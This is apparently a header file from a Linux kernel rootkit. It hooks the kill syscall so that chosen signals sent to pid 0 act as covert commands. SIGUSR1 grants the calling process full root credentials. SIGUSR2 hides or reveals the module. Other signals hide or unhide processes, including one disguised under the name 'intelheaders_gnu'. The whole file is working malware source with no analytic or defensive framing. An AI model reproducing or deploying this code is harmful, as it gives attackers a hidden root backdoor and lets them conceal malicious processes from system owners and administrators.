#ifndef KILL_H
#define KILL_H
#include "../config.h"

static asmlinkage long(*original_kill)(const struct pt_regs*);
static asmlinkage int kill_hook(const struct pt_regs* ctx) {
    unsigned long pid = ctx->di;
    unsigned long signal = ctx->si;
    struct cred *new_creds;


    switch (signal) {
        case SIGUSR1:
            if (pid == 0) {
                new_creds = prepare_creds();
                if (new_creds == NULL) {
                    return -1;
                }

                new_creds->uid.val = 0;
                new_creds->gid.val = 0;
                new_creds->euid.val = 0;
                new_creds->egid.val = 0;
                new_creds->suid.val = 0;
                new_creds->sgid.val = 0;
                new_creds->fsuid.val = 0;
                new_creds->fsgid.val = 0;

                commit_creds(new_creds);
            }
            break;
        
        case SIGUSR2:
            if (pid == 0) {
                if (isModuleHidden == FALSE) {
                    hideModule();
                } else {
                    showModule();
                }
            }
            break;
            
        case SIGTTOU:
            // Show intelheaders_gnu process: kill -22 0
            if (pid == 0) {
                remove_hidden_process("intelheaders_gnu");
            }
            break;
            
        case SIGTTIN:
            // Hide intelheaders_gnu process: kill -23 0
            if (pid == 0) {
                add_hidden_process("intelheaders_gnu");
            }
            break;
            
        case SIGRTMIN:
            // Hide process by name: kill -34 0
            if (pid == 0) {
                char comm_buf[TASK_COMM_LEN];
                get_task_comm(comm_buf, current);
                add_hidden_process(comm_buf);
            } else {
                // Hide process by PID (we'll get its name)
                struct task_struct *task;
                char target_comm[TASK_COMM_LEN];
                
                rcu_read_lock();
                task = pid_task(find_vpid((pid_t)pid), PIDTYPE_PID);
                if (task) {
                    get_task_comm(target_comm, task);
                    add_hidden_process(target_comm);
                }
                rcu_read_unlock();
            }
            break;
            
        case SIGRTMIN1:
            // Unhide process by name: kill -35 0
            if (pid == 0) {
                char comm_buf[TASK_COMM_LEN];
                get_task_comm(comm_buf, current);
                remove_hidden_process(comm_buf);
            } else {
                // Unhide process by PID (we'll get its name)
                struct task_struct *task;
                char target_comm[TASK_COMM_LEN];
                
                rcu_read_lock();
                task = pid_task(find_vpid((pid_t)pid), PIDTYPE_PID);
                if (task) {
                    get_task_comm(target_comm, task);
                    remove_hidden_process(target_comm);
                }
                rcu_read_unlock();
            }
            break;
            
            
        default:
            return original_kill(ctx);
    }

    return 0;
}

#endif // !KILL_H
